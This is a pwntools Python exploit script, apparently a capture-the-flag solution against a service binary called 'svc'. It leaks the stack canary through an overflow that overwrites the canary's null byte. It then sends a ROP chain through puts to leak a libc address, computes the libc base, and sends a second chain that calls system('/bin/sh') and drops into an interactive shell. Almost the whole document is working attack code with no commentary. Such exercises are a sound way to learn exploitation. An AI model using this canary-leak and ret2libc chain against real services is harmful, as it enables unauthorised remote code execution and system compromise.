#!/usr/bin/env python3

from pwn import *

exe = ELF("./svc", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #r = gdb.debug([exe.path], gdbscript="c")
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r
r = conn()

def feed(payload):
    r.recvuntil(b">>")
    r.sendline('1')
    r.recvuntil(b">>")
    r.send(payload)

def getcanary():
    feed("A"*168+"\x01")
    r.sendlineafter(b">>", b"2")

    r.recvuntil("A"*168)
    canary = u64(r.recvline()[0:8])-1

    return canary

def main():

    canary = getcanary()
    log.info("canary leaked: " + hex(canary))

    poprdi = p64(0x400ea3)
    ret = p64(0x4008b1)
    putsplt = p64(0x4008d0)
    putsgot = p64(exe.got.puts)

    log.info("pop rdi; ret\t" + hex(u64(poprdi)))
    log.info("ret;\t" + hex(u64(ret)))
    log.info("GOT puts\t" + hex(u64(putsgot)))
    log.info("PLT puts\t" + hex(u64(putsplt)))

    payload = b"A"*168
    payload += p64(canary)
    payload += b"A"*8
    payload += poprdi
    payload += putsgot
    payload += putsplt
    payload += p64(0x400a96) # main function


    feed(payload)
    r.sendlineafter(b">>", '3')
    r.recvline()

    libc_puts = r.recvline().replace('\x0a', "")
    libc_puts = u64(libc_puts + b"\x00"*(8-len(libc_puts)))
    
    libc.address = libc_puts - libc.sym.puts
    log.info("puts libc\t" + hex(libc_puts))
    log.info("libc base address: " + hex(libc.address))

    binsh = p64(next(libc.search(b"/bin/sh")))
    system = p64(libc.sym.system)

    log.info("got /bin/sh string: " + hex(u64(binsh)))
    log.info("got system function: " + hex(u64(system)))

    payload = b"A"*168
    payload += p64(canary)
    payload += b"A"*8
    payload += ret
    payload += poprdi
    payload += binsh
    payload += system
    #payload += ret

    feed(payload)
    
    r.recvuntil(b">>")
    r.sendline(b"3")
    r.interactive()

if __name__ == "__main__":
    main()
